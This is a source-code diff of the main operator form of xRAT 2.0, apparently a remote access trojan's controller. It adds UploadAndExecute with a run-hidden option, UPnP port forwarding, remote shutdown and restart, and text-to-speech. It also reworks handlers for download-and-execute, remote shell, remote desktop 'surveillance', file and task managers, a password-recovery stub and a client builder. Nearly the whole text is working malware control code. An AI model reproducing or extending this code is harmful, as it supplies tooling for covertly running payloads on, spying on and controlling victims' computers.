@@ -1,9 +1,10 @@
-﻿using System;
-using System.Threading;
-using System.Windows.Forms;
-using Core;
+﻿using Core;
 using Core.Commands;
 using Core.Packets;
+using SpeechLib;
+using System;
+using System.Threading;
+using System.Windows.Forms;
 using xRAT_2.Settings;
 
 namespace xRAT_2.Forms
@@ -21,10 +22,15 @@ namespace xRAT_2.Forms
             XMLSettings.AutoListen = bool.Parse(XMLSettings.ReadValue("AutoListen"));
             XMLSettings.ShowPopup = bool.Parse(XMLSettings.ReadValue("ShowPopup"));
             XMLSettings.Password = XMLSettings.ReadValue("Password");
+            // fallback for old settings
+            XMLSettings.UseUPnP = bool.Parse((!string.IsNullOrEmpty(XMLSettings.ReadValue("UseUPnP"))) ? XMLSettings.ReadValue("UseUPnP") : "False");
 
             if (bool.Parse(XMLSettings.ReadValue("ShowToU")))
             {
-                new frmTermsOfUse().ShowDialog();
+                using (var frm = new frmTermsOfUse())
+                {
+                    frm.ShowDialog();
+                }
                 Thread.Sleep(300);
             }
 
@@ -65,7 +71,6 @@ namespace xRAT_2.Forms
         private void frmMain_Load(object sender, EventArgs e)
         {
             listenServer = new Server(8192);
-
             listenServer.AddTypesToSerializer(typeof(IPacket), new Type[]
             {
                 typeof(Core.Packets.ServerPackets.InitializeCommand),
@@ -73,6 +78,7 @@ namespace xRAT_2.Forms
                 typeof(Core.Packets.ServerPackets.Reconnect),
                 typeof(Core.Packets.ServerPackets.Uninstall),
                 typeof(Core.Packets.ServerPackets.DownloadAndExecute),
+                typeof(Core.Packets.ServerPackets.UploadAndExecute),
                 typeof(Core.Packets.ServerPackets.Desktop),
                 typeof(Core.Packets.ServerPackets.GetProcesses),
                 typeof(Core.Packets.ServerPackets.KillProcess),
@@ -87,6 +93,9 @@ namespace xRAT_2.Forms
                 typeof(Core.Packets.ServerPackets.Update),
                 typeof(Core.Packets.ServerPackets.Monitors),
                 typeof(Core.Packets.ServerPackets.ShellCommand),
+                typeof(Core.Packets.ServerPackets.Rename),
+                typeof(Core.Packets.ServerPackets.Delete),
+                typeof(Core.Packets.ServerPackets.Action),
                 typeof(Core.Packets.ClientPackets.Initialize),
                 typeof(Core.Packets.ClientPackets.Status),
                 typeof(Core.Packets.ClientPackets.UserStatus),
@@ -105,13 +114,20 @@ namespace xRAT_2.Forms
             listenServer.ClientRead += clientRead;
 
             if (XMLSettings.AutoListen)
+            {
+                if (XMLSettings.UseUPnP)
+                    UPnP.ForwardPort(ushort.Parse(XMLSettings.ListenPort.ToString()));
                 listenServer.Listen(XMLSettings.ListenPort);
+            }
         }
 
         private void frmMain_FormClosing(object sender, FormClosingEventArgs e)
         {
             if (listenServer.Listening)
                 listenServer.Disconnect();
+
+            if (XMLSettings.UseUPnP)
+                UPnP.RemovePort(ushort.Parse(XMLSettings.ListenPort.ToString()));
 
             nIcon.Visible = false;
         }
@@ -231,76 +247,185 @@ namespace xRAT_2.Forms
         }
 
         #region "ContextMenu"
-            #region "Connection"
-            private void ctxtUpdate_Click(object sender, EventArgs e)
+        #region "Connection"
+        private void ctxtUpdate_Click(object sender, EventArgs e)
+        {
+            if (lstClients.SelectedItems.Count != 0)
             {
-                if (lstClients.SelectedItems.Count != 0)
-                {
-                    frmUpdate frmU = new frmUpdate(lstClients.SelectedItems.Count);
-                    if (frmU.ShowDialog() == System.Windows.Forms.DialogResult.OK)
-                    {
-                        foreach (ListViewItem lvi in lstClients.SelectedItems)
-                        {
-                            Client c = (Client)lvi.Tag;
-                            new Core.Packets.ServerPackets.Update(_Update.DownloadURL).Execute(c);
-                        }
-                    }
-                }
-            }
-
-            private void ctxtDisconnect_Click(object sender, EventArgs e)
-            {
-                foreach (ListViewItem lvi in lstClients.SelectedItems)
-                {
-                    Client c = (Client)lvi.Tag;
-                    new Core.Packets.ServerPackets.Disconnect().Execute(c);
-                }
-            }
-
-            private void ctxtReconnect_Click(object sender, EventArgs e)
-            {
-                foreach (ListViewItem lvi in lstClients.SelectedItems)
-                {
-                    Client c = (Client)lvi.Tag;
-                    new Core.Packets.ServerPackets.Reconnect().Execute(c);
-                }
-            }
-
-            private void ctxtUninstall_Click(object sender, EventArgs e)
-            {
-                if (MessageBox.Show(string.Format("Are you sure you want to uninstall the client on {0} computer\\s?\nThe clients won't come back!", lstClients.SelectedItems.Count), "Uninstall Confirmation", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == System.Windows.Forms.DialogResult.Yes)
+                frmUpdate frmU = new frmUpdate(lstClients.SelectedItems.Count);
+                if (frmU.ShowDialog() == System.Windows.Forms.DialogResult.OK)
                 {
                     foreach (ListViewItem lvi in lstClients.SelectedItems)
                     {
                         Client c = (Client)lvi.Tag;
-                        new Core.Packets.ServerPackets.Uninstall().Execute(c);
+                        new Core.Packets.ServerPackets.Update(_Update.DownloadURL).Execute(c);
                     }
                 }
             }
-            #endregion
-            
-            #region "System"
-            private void ctxtSystemInformation_Click(object sender, EventArgs e)
+        }
+
+        private void ctxtDisconnect_Click(object sender, EventArgs e)
+        {
+            foreach (ListViewItem lvi in lstClients.SelectedItems)
             {
-                if (lstClients.SelectedItems.Count != 0)
+                Client c = (Client)lvi.Tag;
+                new Core.Packets.ServerPackets.Disconnect().Execute(c);
+            }
+        }
+
+        private void ctxtReconnect_Click(object sender, EventArgs e)
+        {
+            foreach (ListViewItem lvi in lstClients.SelectedItems)
+            {
+                Client c = (Client)lvi.Tag;
+                new Core.Packets.ServerPackets.Reconnect().Execute(c);
+            }
+        }
+
+        private void ctxtUninstall_Click(object sender, EventArgs e)
+        {
+            if (MessageBox.Show(string.Format("Are you sure you want to uninstall the client on {0} computer\\s?\nThe clients won't come back!", lstClients.SelectedItems.Count), "Uninstall Confirmation", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == System.Windows.Forms.DialogResult.Yes)
+            {
+                foreach (ListViewItem lvi in lstClients.SelectedItems)
                 {
-                    Client c = (Client)lstClients.SelectedItems[0].Tag;
-                    if (c.Value.frmSI != null)
-                    {
-                        c.Value.frmSI.Focus();
-                        return;
-                    }
-                    frmSystemInformation frmSI = new frmSystemInformation(c);
-                    frmSI.Show();
+                    Client c = (Client)lvi.Tag;
+                    new Core.Packets.ServerPackets.Uninstall().Execute(c);
                 }
             }
-            
-            private void ctxtDownloadAndExecute_Click(object sender, EventArgs e)
+        }
+        #endregion
+
+        #region "System"
+        private void ctxtSystemInformation_Click(object sender, EventArgs e)
+        {
+            if (lstClients.SelectedItems.Count != 0)
             {
-                if (lstClients.SelectedItems.Count != 0)
+                Client c = (Client)lstClients.SelectedItems[0].Tag;
+                if (c.Value.frmSI != null)
                 {
-                    frmDownloadAndExecute frmDaE = new frmDownloadAndExecute(lstClients.SelectedItems.Count);
-                    if (frmDaE.ShowDialog() == System.Windows.Forms.DialogResult.OK)
+                    c.Value.frmSI.Focus();
+                    return;
+                }
+                frmSystemInformation frmSI = new frmSystemInformation(c);
+                frmSI.Show();
+            }
+        }
+
+        private void ctxtTaskManager_Click(object sender, EventArgs e)
+        {
+            if (lstClients.SelectedItems.Count != 0)
+            {
+                Client c = (Client)lstClients.SelectedItems[0].Tag;
+                if (c.Value.frmTM != null)
+                {
+                    c.Value.frmTM.Focus();
+                    return;
+                }
+                frmTaskManager frmTM = new frmTaskManager(c);
+                frmTM.Show();
+            }
+        }
+
+        private void ctxtFileManager_Click(object sender, EventArgs e)
+        {
+            if (lstClients.SelectedItems.Count != 0)
+            {
+                Client c = (Client)lstClients.SelectedItems[0].Tag;
+                if (c.Value.frmFM != null)
+                {
+                    c.Value.frmFM.Focus();
+                    return;
+                }
+                frmFileManager frmFM = new frmFileManager(c);
+                frmFM.Show();
+            }
+        }
+
+        private void ctxtPasswordRecovery_Click(object sender, EventArgs e)
+        {
+            if (lstClients.SelectedItems.Count != 0)
+            {
+                // TODO
+            }
+        }
+
+        private void ctxtRemoteShell_Click(object sender, EventArgs e)
+        {
+            if (lstClients.SelectedItems.Count != 0)
+            {
+                Client c = (Client)lstClients.SelectedItems[0].Tag;
+                if (c.Value.frmRS != null)
+                {
+                    c.Value.frmRS.Focus();
+                    return;
+                }
+                frmRemoteShell frmRS = new frmRemoteShell(c);
+                frmRS.Show();
+            }
+        }
+
+        private void ctxtShutdown_Click(object sender, EventArgs e)
+        {
+            if (lstClients.SelectedItems.Count != 0)
+            {
+                foreach (ListViewItem lvi in lstClients.SelectedItems)
+                {
+                    Client c = (Client)lvi.Tag;
+                    new Core.Packets.ServerPackets.Action(0).Execute(c);
+                }
+            }
+        }
+
+        private void ctxtRestart_Click(object sender, EventArgs e)
+        {
+            if (lstClients.SelectedItems.Count != 0)
+            {
+                foreach (ListViewItem lvi in lstClients.SelectedItems)
+                {
+                    Client c = (Client)lvi.Tag;
+                    new Core.Packets.ServerPackets.Action(1).Execute(c);
+                }
+            }
+        }
+
+        private void ctxtStandby_Click(object sender, EventArgs e)
+        {
+            if (lstClients.SelectedItems.Count != 0)
+            {
+                foreach (ListViewItem lvi in lstClients.SelectedItems)
+                {
+                    Client c = (Client)lvi.Tag;
+                    new Core.Packets.ServerPackets.Action(2).Execute(c);
+                }
+            }
+        }
+        #endregion
+
+        #region "Surveillance"
+        private void ctxtRemoteDesktop_Click(object sender, EventArgs e)
+        {
+            if (lstClients.SelectedItems.Count != 0)
+            {
+                Client c = (Client)lstClients.SelectedItems[0].Tag;
+                if (c.Value.frmRDP != null)
+                {
+                    c.Value.frmRDP.Focus();
+                    return;
+                }
+                frmRemoteDesktop frmRDP = new frmRemoteDesktop(c);
+                frmRDP.Show();
+            }
+        }
+        #endregion
+
+        #region "Miscellaneous"
+        private void ctxtDownloadAndExecute_Click(object sender, EventArgs e)
+        {
+            if (lstClients.SelectedItems.Count != 0)
+            {
+                using (var frm = new frmDownloadAndExecute(lstClients.SelectedItems.Count))
+                {
+                    if (frm.ShowDialog() == System.Windows.Forms.DialogResult.OK)
                     {
                         foreach (ListViewItem lvi in lstClients.SelectedItems)
                         {
@@ -310,85 +435,34 @@ namespace xRAT_2.Forms
                     }
                 }
             }
-            
-            private void ctxtTaskManager_Click(object sender, EventArgs e)
+        }
+
+        private void ctxtUploadAndExecute_Click(object sender, EventArgs e)
+        {
+            if (lstClients.SelectedItems.Count != 0)
             {
-                if (lstClients.SelectedItems.Count != 0)
+                using (var frm = new frmUploadAndExecute(lstClients.SelectedItems.Count))
                 {
-                    Client c = (Client)lstClients.SelectedItems[0].Tag;
-                    if (c.Value.frmTM != null)
+                    if (frm.ShowDialog() == System.Windows.Forms.DialogResult.OK)
                     {
-                        c.Value.frmTM.Focus();
-                        return;
+                        foreach (ListViewItem lvi in lstClients.SelectedItems)
+                        {
+                            Client c = (Client)lvi.Tag;
+                            new Core.Packets.ServerPackets.UploadAndExecute(UploadAndExecute.File, UploadAndExecute.FileName, UploadAndExecute.RunHidden).Execute(c);
+                            CommandHandler.HandleStatus(c, new Core.Packets.ClientPackets.Status("Uploading file..."), this);
+                        }
                     }
-                    frmTaskManager frmTM = new frmTaskManager(c);
-                    frmTM.Show();
                 }
             }
-            
-            private void ctxtFileManager_Click(object sender, EventArgs e)
+        }
+
+        private void ctxtVisitWebsite_Click(object sender, EventArgs e)
+        {
+            if (lstClients.SelectedItems.Count != 0)
             {
-                if (lstClients.SelectedItems.Count != 0)
+                using (var frm = new frmVisitWebsite(lstClients.SelectedItems.Count))
                 {
-                    Client c = (Client)lstClients.SelectedItems[0].Tag;
-                    if (c.Value.frmFM != null)
-                    {
-                        c.Value.frmFM.Focus();
-                        return;
-                    }
-                    frmFileManager frmFM = new frmFileManager(c);
-                    frmFM.Show();
-                }
-            }
-            
-            private void ctxtPasswordRecovery_Click(object sender, EventArgs e)
-            {
-                if (lstClients.SelectedItems.Count != 0)
-                {
-                    // TODO
-                }
-            }
-            
-            private void ctxtRemoteShell_Click(object sender, EventArgs e)
-            {
-                if (lstClients.SelectedItems.Count != 0)
-                {
-                    Client c = (Client)lstClients.SelectedItems[0].Tag;
-                    if (c.Value.frmRS != null)
-                    {
-                        c.Value.frmRS.Focus();
-                        return;
-                    }
-                    frmRemoteShell frmRS = new frmRemoteShell(c);
-                    frmRS.Show();
-                }
-            }
-            #endregion
-            
-            #region "Surveillance"
-            private void ctxtRemoteDesktop_Click(object sender, EventArgs e)
-            {
-                if (lstClients.SelectedItems.Count != 0)
-                {
-                    Client c = (Client)lstClients.SelectedItems[0].Tag;
-                    if (c.Value.frmRDP != null)
-                    {
-                        c.Value.frmRDP.Focus();
-                        return;
-                    }
-                    frmRemoteDesktop frmRDP = new frmRemoteDesktop(c);
-                    frmRDP.Show();
-                }
-            }
-            #endregion
-            
-            #region "Miscellaneous"
-            private void ctxtVisitWebsite_Click(object sender, EventArgs e)
-            {
-                if (lstClients.SelectedItems.Count != 0)
-                {
-                    frmVisitWebsite frmVW = new frmVisitWebsite(lstClients.SelectedItems.Count);
-                    if (frmVW.ShowDialog() == System.Windows.Forms.DialogResult.OK)
+                    if (frm.ShowDialog() == System.Windows.Forms.DialogResult.OK)
                     {
                         foreach (ListViewItem lvi in lstClients.SelectedItems)
                         {
@@ -398,22 +472,40 @@ namespace xRAT_2.Forms
                     }
                 }
             }
-            
-            private void ctxtShowMessagebox_Click(object sender, EventArgs e)
+        }
+
+        private void ctxtShowMessagebox_Click(object sender, EventArgs e)
+        {
+            if (lstClients.SelectedItems.Count != 0)
             {
-                if (lstClients.SelectedItems.Count != 0)
+                Client c = (Client)lstClients.SelectedItems[0].Tag;
+                if (c.Value.frmSM != null)
                 {
-                    Client c = (Client)lstClients.SelectedItems[0].Tag;
-                    if (c.Value.frmSM != null)
+                    c.Value.frmSM.Focus();
+                    return;
+                }
+                frmShowMessagebox frmSM = new frmShowMessagebox(c);
+                frmSM.Show();
+            }
+        }
+        private void ctxtTextToSpeech_Click(object sender, EventArgs e)
+        {
+            if (lstClients.SelectedItems.Count != 0)
+            {
+                using (var frm = new frmTextToSpeech(lstClients.SelectedItems.Count))
+                {
+                    if (frm.ShowDialog() == System.Windows.Forms.DialogResult.OK)
                     {
-                        c.Value.frmSM.Focus();
-                        return;
+                        foreach (ListViewItem lvi in lstClients.SelectedItems)
+                        {
+                            Client c = (Client)lvi.Tag;
+                            new Core.Packets.ServerPackets.TextToSpeech(TextToSpeech.Speech).Execute(c);
+                        }
                     }
-                    frmShowMessagebox frmSM = new frmShowMessagebox(c);
-                    frmSM.Show();
                 }
             }
-            #endregion
+        }
+        #endregion
         #endregion
 
         #region "MenuStrip"
@@ -424,12 +516,18 @@ namespace xRAT_2.Forms
 
         private void menuSettings_Click(object sender, EventArgs e)
         {
-            new frmSettings(listenServer).ShowDialog();
+            using (var frm = new frmSettings(listenServer))
+            {
+                frm.ShowDialog();
+            }
         }
 
         private void menuBuilder_Click(object sender, EventArgs e)
         {
-            new frmBuilder().ShowDialog();
+            using (var frm = new frmBuilder())
+            {
+                frm.ShowDialog();
+            }
         }
 
         private void menuStatistics_Click(object sender, EventArgs e)
@@ -437,12 +535,20 @@ namespace xRAT_2.Forms
             if (listenServer.BytesReceived == 0 || listenServer.BytesSent == 0)
                 MessageBox.Show("Please wait for at least one connected Client!", "xRAT 2.0", MessageBoxButtons.OK, MessageBoxIcon.Information);
             else
-                new frmStatistics(listenServer.BytesReceived, listenServer.BytesSent, listenServer.ConnectedClients, listenServer.AllTimeConnectedClients).ShowDialog();
+            {
+                using (var frm = new frmStatistics(listenServer.BytesReceived, listenServer.BytesSent, listenServer.ConnectedClients, listenServer.AllTimeConnectedClients))
+                {
+                    frm.ShowDialog();
+                }
+            }
         }
 
         private void menuAbout_Click(object sender, EventArgs e)
         {
-            new frmAbout().ShowDialog();
+            using (var frm = new frmAbout())
+            {
+                frm.ShowDialog();
+            }
         }
         #endregion
 
@@ -453,5 +559,7 @@ namespace xRAT_2.Forms
             this.ShowInTaskbar = (this.WindowState == FormWindowState.Normal);
         }
         #endregion
+
+
     }
 }
